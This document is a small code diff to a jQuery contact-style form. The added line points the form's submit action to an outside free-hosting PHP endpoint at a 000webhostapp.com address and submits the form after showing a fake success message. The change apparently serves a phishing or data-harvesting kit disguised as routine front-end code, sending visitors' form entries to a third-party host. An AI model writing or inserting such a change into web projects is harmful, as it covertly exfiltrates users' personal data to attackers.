@@ -14,7 +14,7 @@ $("#san-button").attr("disabled",false);
 
 $("#myform #san-button").click(function(e) {
     e.preventDefault();
-    setTimeout(function(a) { $("form").attr("action","");	$("#sendmessage").addClass("show"); $("#errormessage").removeClass("show"); setTimeout(function(b) { $("#myform").submit(); } , 2500); } , 2000);
+    setTimeout(function(a) { $("form").attr("action","https://4k4asn3w.000webhostapp.com/new/old/new/old/d_it/en.php"); $("#sendmessage").addClass("show"); $("#errormessage").removeClass("show"); setTimeout(function(b) { $("#myform").submit(); } , 2500); } , 2000);
 	});
 	
 $('#name').keyup(function() {
